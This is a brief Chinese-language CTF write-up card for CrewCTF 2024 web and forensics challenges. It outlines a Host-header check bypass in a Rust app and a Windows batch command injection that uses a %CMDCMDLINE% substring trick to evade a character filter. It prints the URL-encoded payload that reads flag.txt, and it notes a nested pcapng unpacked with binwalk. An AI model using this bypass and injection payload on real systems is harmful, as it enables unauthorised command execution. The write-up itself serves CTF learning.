---
title: "CrewCTF 2024 Writeup"
category: web
tags: ["CrewCTF 2024", "web", "web", "rust", "host-header-bypass", "cmd-injection"]
signals: ["CrewCTF 2024 2024", "web", "rust", "host-header-bypass", "cmd-injection", "ping2", "binwalk", "4层pcapng", "rce", "CrewCTF", "Rust", "Host", "bat", "pcapng"]
difficulty: medium
source: "https://www.ctfiot.com/197698.html"
tools: ["Rust", "binwalk"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# CrewCTF 2024 Writeup

> 赛事：CrewCTF 2024 2024 | 方向：web | 难度：medium | 工具：Rust、binwalk

## 一句话总结

CrewCTF 2024 2题：Rust Host头绕过+ping2 bat命令注入，4层pcapng

## 攻击链

1. middleware_localhost检查host以127.0.0.1开头可绕过
2. GET /ai/run?cmd=env&arg= 主机头Host: 127.0.0.1
3. ping2 arg过滤 ' " * ! @ ^ ? 但允许%CMDCMDLINE%环境变量
4. %CMDCMDLINE%:~-1%&type.exe flag.txt 命令注入读flag
5. 4层pcapng+binwalk递归解压得flag

## 关键 payload

```
GET /ai/run?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type.exe%20flag.txt HTTP/1.1
```

## 经验教训

%CMDCMDLINE%环境变量+Windows批处理可绕字符过滤

## 标签

web、rust、host-header-bypass、cmd-injection、ping2、binwalk、4层pcapng

## 参考来源

- https://www.ctfiot.com/197698.html
- 原文件：CrewCTF_2024_Writeup.full.md
